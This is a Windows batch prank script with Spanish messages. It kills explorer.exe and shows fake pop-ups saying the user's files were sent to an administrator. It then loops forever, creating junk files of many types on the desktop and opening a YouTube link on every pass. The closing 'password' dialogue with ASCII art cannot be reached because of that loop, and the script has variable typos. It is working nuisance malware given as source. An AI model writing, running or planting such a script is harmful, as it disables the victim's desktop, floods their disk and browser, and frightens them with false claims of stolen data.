echo off
title Hola :)
cd Desktop
TASKKILL /F /IM explorer.exe
msg * espere un momento.
msg * espere un momento..
msg * espere un momento...
msg * los archivos han sido enviados al administrador correctamente
set hoal = 1
:bucle
:menu
cls
set /a hoal = %hoal% + 1
echo xd>>%hoal%.txt
echo xd>>%hoal%.docx
echo xd>>%hoal%.pdf
echo xd>>%hoal%.bat
echo xd>>%hoal%.doc
echo xd>>%hoal%.jpg
echo xd>>%hoal%.vbs
echo xd>>%hoal%.avi
echo xd>>%hoal%.odt
echo xd>>%hoal%.psd
echo xd>>%hoam%.rar
echo xd>>%hoam%.bmp
echo xd>>%hoal%.flv
echo xd>>%hoal%.dll
echo xd>>%hoal%.pdf
echo xd>>%hoal%.doc
echo xd>>%hoal%.bat
echo xd>>%hoal%.cpp
echo xd>>%hoal%.jar
echo xd>>%hoal%.html
echo xd>>%hoal%.htm
echo xd>>%hoal%.php
echo xd>>%hoal%.css
echo xd>>%hoal%.rar
start https://youtu.be/uvXYYFO7h0Q
goto menu
goto bucle
cls
echo off
timeout /T 1 /nobreak
echo estamos contactando al administrador...
echo       FELICIDADES SE LOGRÓ CONTACTAR CON EL ADMINISTRADOR
cls
echo                        .
echo                       ...
echo                      .....
echo                     .......
echo %date% %time%       . °.° .   ...
echo                     . --- .   
echo                     .......
echo                       /|\
echo                      //|\\
echo                 ///////\\\\\\\\
echo                 \\\\\\\////////
echo                      \\//
echo                      \\//
echo                      \\//
echo                      \\//
echo                      //\\
echo                     //  \\
echo                    //    \\
echo                   //      \\
set /p pass=Saludalo con un agradable Hola!!
if %pass%==Hola (goto passcorrecto)
if %pass%==Hola!! (goto passcorrecto)
:passcorrecto
timeout /t 1 /nobreak
echo                        .
echo                       ...
echo                      .....
echo                     .......
echo %date% %time%       . °.° .   Oh Hola, eres de las pocas personas que aún saluda
echo                     . --- .   gracias, ahora te daré la contraseña para salir de aquí
echo                     .......            es: Terminar
echo                       /|\      pero por favor no lo hagas al salir dejarás de pensar en mi
echo                      //|\\     y seré olvidado. Te lo ruego
echo                 ///////\\\\\\\\
echo                 \\\\\\\////////
echo                      \\//
echo                      \\//
echo                      \\//
echo                      \\//
echo                      //\\
echo                     //  \\
echo                    //    \\
echo                   //      \\
set /p pass=Quieres salir?
if %pass%==si (goto passcorrecto)
if %pass%==Si (goto passcorrecto)
if %pass%==SI (goto passcorrecto)
:passcorrecto
echo Adios
msg * Adios
msg * Diviertete borrandome :)
start explorer.exe
pause
exit
